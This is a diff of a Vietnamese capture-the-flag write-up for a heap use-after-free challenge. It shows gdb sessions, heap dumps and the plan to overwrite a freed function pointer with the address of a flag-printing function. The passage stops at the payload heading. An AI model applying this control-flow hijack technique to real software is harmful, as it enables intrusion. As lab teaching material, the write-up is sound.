@@ -209,16 +209,21 @@ void death(struct Dog* dog){
 **3.Review heap**
 
 - Thông tin binary
+
 ```
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
 Full RELRO      Canary found      NX enabled    No PIE          No RPATH   RW-RUNPATH   94 Symbols     Yes      0               4       ./ch63
 ASLR is ON
 ```
+
 - Mở file bằng gdb
+
 ```
 gdb ./ch63
 ```
+
 - Hiển thị các function
+
 ```
 (gdb) info functions 
 All defined functions:
@@ -264,6 +269,7 @@ Non-debugging symbols:
 0x08048e60  __stack_chk_fail_local
 0x08048e74  _fini
 ```
+
 - Đặt break tại các function **newDog, newDogHouse, death**
 
 ```
@@ -276,15 +282,18 @@ Breakpoint 3 at 0x8048a3c
 (gdb) b * death 
 Breakpoint 4 at 0x8048871
 ```
-- Thực thi bằng **run**
+- Thực thi bằng **run**.
+
 ```
 run
 ```
+
 - Chọn 1 và nhập giá trị **AAAA**, nhập c để chương trình tiếp tục chạy
 ![](https://raw.githubusercontent.com/jkana/Writeup/main/Root-me/Images/1.JPG)
 - Chọn 4 để free dog. Chương trình sẽ break trước khi thực hiện việc free, vì vậy lúc này ta có thể kiểm tra thông tin heap.
 ![](https://raw.githubusercontent.com/jkana/Writeup/main/Root-me/Images/2.JPG)
 - Sử dụng **info proc map** để tìm địa chỉ của vùng heap
+
 ```
 (gdb) info proc map
 process 5662
@@ -308,13 +317,16 @@ Mapped address spaces:
         0xf7f22000 0xf7f23000     0x1000    0x20000 /lib/old32/ld-2.19.so
         0xffd23000 0xffd44000    0x21000        0x0 [stack]
 ```
+
 - Heap được bắt đầu từ **0x9595000** cho tới **0x95b6000**. Sử dụng **x/100x 0x9595000** để kiểm tra vùng nhớ heap
+
 ```
 (gdb) x/100x 0x9595000
 0x9595000:      0x00000000      0x00000021      0x41414141      0x00000000
 0x9595010:      0x00000000      0x08048765      0x080487cb      0x08048871
 0x9595020:      0x00000000      0x00020fe1      0x00000000      0x00000000
 ```
+
 - **0x41414141** chính là **AAAA** do ta nhập vào. 8 byte **\x00** tiếp theo là vùng nhớ được cấp cho **name[12]**. **0x08048765** là vùng nhớ con trỏ **bark** trỏ vào, **0x080487cb** là vùng nhớ con trỏ **bringBackTheFlag** trỏ vào, **0x08048871** là vùng nhớ con trỏ **death** trỏ vào. Ta có thể kiểm tra bằng lệnh **info symbol**.
 
 ```
@@ -358,12 +370,14 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 
 - Kiểm tra heap ta thấy bark tới **0x45454545** và crash. Vì con trỏ không được reset nên nó vẫn trỏ tới **0x9595014** và ta hoàn toàn có thể kiểm soát được giá trị ở địa chỉ này.
+
 ```
 (gdb)  x/50x 0x9595000
 0x9595000:      0x00000000      0x00000021      0x42424242      0x43434343
 0x9595010:      0x44444444      0x45454545      0x46464646      0x00000000
 0x9595020:      0x00000000      0x00020fe1      0x00000000      0x00000000
 ```
+
 - Mục tiêu là viết giá trị **0x080487cb** (**bringBackTheFlag**)vào địa chỉ **0x9595014** 
 
 **4.Payload**
